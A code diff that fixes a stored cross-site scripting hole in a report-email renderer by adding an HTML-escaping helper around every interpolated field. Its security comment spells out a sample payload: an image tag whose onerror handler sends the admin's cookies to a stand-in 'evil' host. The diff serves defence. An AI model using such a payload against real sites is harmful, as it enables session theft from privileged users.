@@ -11,6 +11,28 @@
 
 const BASE = (typeof process !== 'undefined' && process.env && process.env.PUBLIC_BASE_URL) || 'https://app.targetreteam.com'
 
+// SECURITY (stored XSS fix): renderReportHtml interpolates record fields
+// (contact/visitor names, task titles, listing addresses) straight into
+// an HTML string with dangerouslySetInnerHTML on the admin preview side,
+// and the same markup goes out in the actual emailed report. Several of
+// those fields are populated from untrusted sources with no sanitization
+// — contacts.first_name/last_name via api/webhook-inbound.js (Zapier/API
+// Nation, fed by public lead forms) and oh_visitors names typed in off a
+// sign-in sheet. Without escaping, a lead named e.g.
+// '<img src=x onerror=fetch("https://evil/steal?c="+document.cookie)>'
+// executes in the logged-in admin's browser the moment Report Builder
+// renders a report with the contacts/open_house block — stored XSS
+// against a privileged account. Escape every dynamic value before it
+// enters the template.
+function escapeHtml(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
 // Resolve a named range to {from,to} ISO date strings (ET-ish, date only)
 function resolveRange(range) {
   const now = new Date()
@@ -137,28 +159,28 @@ async function computeReport(supabase, def) {
 function renderReportHtml(def, data) {
   const wrap = s => '<div style="font-family:Arial,sans-serif;max-width:640px;margin:0 auto;color:#0F172A">' + s + '</div>'
   const header = '<div style="background:#0F172A;color:#fff;padding:20px 24px;border-radius:12px 12px 0 0">' +
-    '<div style="font-size:20px;font-weight:800">' + (def.name || 'Team Report') + '</div>' +
+    '<div style="font-size:20px;font-weight:800">' + escapeHtml(def.name || 'Team Report') + '</div>' +
     '<div style="font-size:13px;opacity:.75">' + data.range.from + ' → ' + data.range.to + '</div></div>'
   const body = data.blocks.map(b => {
     if (b.type === 'stat') {
       return '<div style="display:inline-block;width:47%;margin:1%;padding:14px 16px;background:#F8FAFC;border:1px solid #E2E8F0;border-radius:10px;vertical-align:top">' +
-        '<div style="font-size:12px;color:#64748B;font-weight:600">' + b.title + '</div>' +
-        '<div style="font-size:24px;font-weight:800;color:#0F172A">' + b.value + '</div>' +
-        '<div style="font-size:12px;color:#94A3B8">' + (b.sub || '') + '</div></div>'
+        '<div style="font-size:12px;color:#64748B;font-weight:600">' + escapeHtml(b.title) + '</div>' +
+        '<div style="font-size:24px;font-weight:800;color:#0F172A">' + escapeHtml(b.value) + '</div>' +
+        '<div style="font-size:12px;color:#94A3B8">' + escapeHtml(b.sub || '') + '</div></div>'
     }
     if (b.type === 'list') {
       const items = b.items.map(it =>
-        '<a href="' + it.href + '" style="display:block;padding:9px 12px;border-bottom:1px solid #F1F5F9;text-decoration:none;color:#0F172A">' +
-        '<span style="font-weight:600;font-size:13px">' + it.label + '</span>' +
-        '<span style="float:right;font-size:11px;color:#94A3B8">' + (it.meta || '') + ' ›</span></a>').join('')
+        '<a href="' + escapeHtml(it.href) + '" style="display:block;padding:9px 12px;border-bottom:1px solid #F1F5F9;text-decoration:none;color:#0F172A">' +
+        '<span style="font-weight:600;font-size:13px">' + escapeHtml(it.label) + '</span>' +
+        '<span style="float:right;font-size:11px;color:#94A3B8">' + escapeHtml(it.meta || '') + ' ›</span></a>').join('')
       return '<div style="margin:14px 0;border:1px solid #E2E8F0;border-radius:10px;overflow:hidden">' +
-        '<div style="padding:9px 12px;background:#F8FAFC;font-size:12px;font-weight:700;color:#334155">' + b.title + '</div>' +
+        '<div style="padding:9px 12px;background:#F8FAFC;font-size:12px;font-weight:700;color:#334155">' + escapeHtml(b.title) + '</div>' +
         items + '</div>'
     }
     if (b.type === 'table') {
-      const th = b.head.map(h => '<th style="text-align:left;padding:8px 10px;font-size:11px;color:#64748B;border-bottom:2px solid #E2E8F0">' + h + '</th>').join('')
-      const tr = b.rows.map(r => '<tr>' + r.map((c, i) => '<td style="padding:8px 10px;font-size:13px;border-bottom:1px solid #F1F5F9;' + (i === 0 ? 'font-weight:600' : 'color:#475569') + '">' + c + '</td>').join('') + '</tr>').join('')
-      return '<div style="margin:14px 0"><div style="font-size:12px;font-weight:700;color:#334155;margin-bottom:6px">' + b.title + '</div>' +
+      const th = b.head.map(h => '<th style="text-align:left;padding:8px 10px;font-size:11px;color:#64748B;border-bottom:2px solid #E2E8F0">' + escapeHtml(h) + '</th>').join('')
+      const tr = b.rows.map(r => '<tr>' + r.map((c, i) => '<td style="padding:8px 10px;font-size:13px;border-bottom:1px solid #F1F5F9;' + (i === 0 ? 'font-weight:600' : 'color:#475569') + '">' + escapeHtml(c) + '</td>').join('') + '</tr>').join('')
+      return '<div style="margin:14px 0"><div style="font-size:12px;font-weight:700;color:#334155;margin-bottom:6px">' + escapeHtml(b.title) + '</div>' +
         '<table style="width:100%;border-collapse:collapse;border:1px solid #E2E8F0;border-radius:8px"><thead><tr>' + th + '</tr></thead><tbody>' + tr + '</tbody></table></div>'
     }
     return ''
